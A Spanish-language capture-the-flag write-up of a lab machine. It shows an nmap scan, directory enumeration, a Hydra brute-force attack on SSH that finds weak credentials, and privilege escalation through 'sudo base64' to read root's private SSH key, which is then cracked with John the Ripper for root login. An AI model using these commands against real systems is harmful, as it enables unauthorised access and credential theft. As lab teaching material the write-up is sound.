# Fase 1- Tanteo
![image](https://github.com/haw441kings/ThehHackersLabs-WriteUps/assets/136659799/29a7ba70-ed90-4f55-b4fa-fb64df41baee)
En esta fase inicial, realizamos un escaneo de puertos para identificar los servicios disponibles en la máquina objetivo. Utilizamos la herramienta Nmap con una serie de opciones para obtener información detallada y realizar un análisis exhaustivo de los puertos abiertos.
### Comando Nmap utilizado:

`sudo nmap -p- --open -sS -sC -sV --min-rate 5000 -vvv -n -Pn 192.168.52.139 -oN Escaneo`

### Detalles del Comando:

- `sudo nmap -p- --open -sS -sC -sV --min-rate 5000 -vvv -n -Pn 192.168.52.139 -oN Escaneo`
- `-p-`: Escaneo de todos los puertos.
- `--open`: Muestra solo puertos abiertos.
- `-sS`: Escaneo SYN para determinar el estado de los puertos.
- `-sC`: Activa detección de versiones y vulnerabilidades.
- `-sV`: Escaneo de versiones de servicios.
- `--min-rate 5000`: Velocidad mínima de escaneo.
- `-vvv`: Verbosidad muy alta para información detallada.
- `-n`: Desactiva la resolución de DNS.
- `-Pn`: Ignora la detección de hosts en línea.
- `192.168.52.139`: IP de la máquina objetivo.
- `-oN Escaneo`: Guarda resultados en archivo "Escaneo".

### Resultados:

#### Puertos Abiertos:

1. **22/tcp(SSH):** OpenSSH 9.2p1 
2.  **80/tcp(HTTP):** Apache httpd 2.4.57

### Puerto 80
Al identificar que el puerto 80 estaba abierto durante el escaneo, se procedió a ingresar la dirección IP en el navegador. Se encontró una pagina llamada default de Apache2 Debian.
![image](https://github.com/haw441kings/ThehHackersLabs-WriteUps/assets/136659799/f4a79d88-e062-4a9b-a66e-d46725389dca)

# Fase 2- Exploración

#### FeroxBuster
```python
301      GET        9l       28w      314c http://192.168.1.11/summary => http://192.168.1.11/summary/
200      GET        1l        3w       31c http://192.168.1.11/summary/summary.html
```
Encontramos el directory listing `summary` y el archivo `summary.html`.

#### summary.html
![image](https://github.com/haw441kings/ThehHackersLabs-WriteUps/assets/136659799/be06a3b1-9801-44f3-816a-26dc6933facc)
Encontramos esto, y literalmente no hay nada mas.

# Fase 3- Explotación

#### Hydra SSH
```python
> hydra 192.168.1.11 -t 64 ssh /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -P /usr/share/wordlists/seclists/Passwords/xato-net-10-million-passwords-1000.txt
```
Le vamos a realizar fuerza bruta al protocolo `ssh` con este comando.

```python
[DATA] attacking ssh://192.168.1.11:22/
[22][ssh] host: 192.168.1.11   login: info   password: qwerty
```
Y lo encontramos.

![image](https://github.com/haw441kings/ThehHackersLabs-WriteUps/assets/136659799/cbd884ed-b65c-4f42-91c9-adae1dce4d7b)
Y estamos dentro!.

# Fase 3- Explotación

#### sudo -l
![image](https://github.com/haw441kings/ThehHackersLabs-WriteUps/assets/136659799/60f86ec8-9701-4709-9631-b77ded667d5a)
Despues de hacer el tratamiento de la TTY, vemos que podemos ejecutar el binario `base64` como el usuario `root`.

![image](https://github.com/haw441kings/ThehHackersLabs-WriteUps/assets/136659799/75e5821a-8c72-4ef4-a3a7-de104e20e9c9)

Este comando `sudo base64 "/root/.ssh/id_rsa" | base64 --decode` sirve para decodificar el contenido de un archivo que ha sido codificado en base64.

#### rsa
![image](https://github.com/haw441kings/ThehHackersLabs-WriteUps/assets/136659799/b230cb05-09f0-4104-9a28-82c3a28ad6fc)

![image](https://github.com/haw441kings/ThehHackersLabs-WriteUps/assets/136659799/356de977-bb4b-486a-8419-63f45d5829a6)

Se edita el archivo `id_rsa` en el editor `nano`, se convierte en un formato compatible con John the Ripper para posibles ataques de fuerza bruta (`ssh2john id_rsa`), se intenta descifrar la clave privada utilizando una lista de palabras (`john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt`), se ajustan los permisos del archivo `id_rsa` para mayor seguridad (`chmod 600 id_rsa`), y finalmente se establece una conexión SSH al servidor remoto utilizando la clave privada como identificación (`ssh -i id_rsa root@192.168.1.11`).
